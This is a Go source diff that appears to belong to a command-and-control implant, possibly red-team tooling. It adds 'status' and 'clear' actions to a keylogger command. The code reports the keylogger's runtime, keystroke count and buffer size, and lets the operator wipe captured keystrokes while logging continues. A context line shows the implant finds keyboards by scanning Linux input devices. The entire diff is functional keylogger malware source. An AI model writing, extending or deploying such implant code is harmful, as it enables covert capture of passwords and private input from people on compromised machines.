@@ -60,7 +60,7 @@ func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
 	var args keylogArgs
 
 	if task.Params == "" {
-		return errorResult("Error: action required. Use: start, stop, dump")
+		return errorResult("Error: action required. Use: start, stop, dump, status, clear")
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
@@ -74,8 +74,12 @@ func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
 		return keylogStop()
 	case "dump":
 		return keylogDump()
+	case "status":
+		return keylogStatus()
+	case "clear":
+		return keylogClear()
 	default:
-		return errorf("Unknown action: %s. Use: start, stop, dump", args.Action)
+		return errorf("Unknown action: %s. Use: start, stop, dump, status, clear", args.Action)
 	}
 }
 
@@ -152,6 +156,36 @@ func keylogDump() structs.CommandResult {
 		duration.Round(time.Second), kl.keyCount, output)
 
 	return successResult(result)
+}
+
+func keylogStatus() structs.CommandResult {
+	kl.mu.Lock()
+	defer kl.mu.Unlock()
+
+	if !kl.running {
+		return successResult("Keylogger is not running.")
+	}
+
+	duration := time.Since(kl.startTime)
+	bufSize := kl.buffer.Len()
+
+	return successf("Keylogger status:\n  State:      running\n  Duration:   %s\n  Keystrokes: %d\n  Buffer:     %s",
+		duration.Round(time.Second), kl.keyCount, formatFileSize(int64(bufSize)))
+}
+
+func keylogClear() structs.CommandResult {
+	kl.mu.Lock()
+	defer kl.mu.Unlock()
+
+	if !kl.running {
+		return errorResult("Keylogger is not running")
+	}
+
+	cleared := kl.keyCount
+	kl.buffer.Reset()
+	kl.keyCount = 0
+
+	return successf("Buffer cleared (%d keystrokes removed). Keylogger continues running.", cleared)
 }
 
 // findKeyboardDevices scans /dev/input/event* for keyboard-capable devices.
